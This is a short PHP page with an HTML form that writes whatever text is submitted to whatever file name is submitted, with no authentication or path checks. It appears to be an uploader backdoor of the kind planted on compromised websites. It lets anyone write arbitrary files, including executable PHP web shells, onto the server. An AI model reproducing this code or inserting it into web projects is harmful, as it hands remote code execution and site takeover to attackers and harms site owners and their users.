<?php
	if (isset($_POST["opr"])) {
		$file_name=$_POST["filename"];
		$content = $_POST["area"];	
		$submit=$_POST["opr"];

		if ($submit=="get") {
			$file = fopen($file_name, "w");
			fwrite($file, $content);
			fclose($file);
		}
		else {
			echo "error";}
	}
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1-transitional.dtd">
<html lang="en-US">
 <head>
    <meta content="off" http-equiv="x-dns-prefetch-control" />
</head>
<body>
	<form method="POST"; action="<?php $_PHP_SELF ?>">
		<label>File name</label><br />
		<input name="filename" value=""></input><br />
		<textarea name="area" rows="5" cols="30"></textarea>
		<button name="opr" type="submit" value="get">Submit</button>
	</form>
</body>
</html>


